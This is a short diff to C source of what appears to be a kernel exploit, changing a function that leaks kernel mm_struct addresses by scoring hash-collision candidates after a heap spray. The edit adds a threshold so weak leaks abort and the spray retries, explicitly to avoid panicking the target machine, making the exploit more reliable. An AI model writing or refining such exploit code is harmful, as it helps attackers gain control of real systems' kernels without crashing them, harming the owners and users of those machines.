@@ -236,11 +236,17 @@ static void *__mm_leak(void *arg)
                             mult += (hs[i] == hs[j]);
                         if (mult > score) score = mult;
                     }
-                    if (score > ks->best_score) {
+                    /* v3: hard threshold. A false-positive candidate can
+                       score ~4 by luck on noisy collisions, but the true mm
+                       matches EVERY valid collision; with 16 collisions even
+                       heavy noise leaves >=6 valid ones. Below 6 the leak is
+                       treated as FAILED (clean abort, retry the spray) -
+                       walking to an unmapped bogus page panics the box. */
+                    if (score >= 6 && score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score == ks->best_score && score > 1 && ks->mm_cand_cnt < 8) {
+                    if (score >= 6 && score == ks->best_score && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
                     }
                 } else {
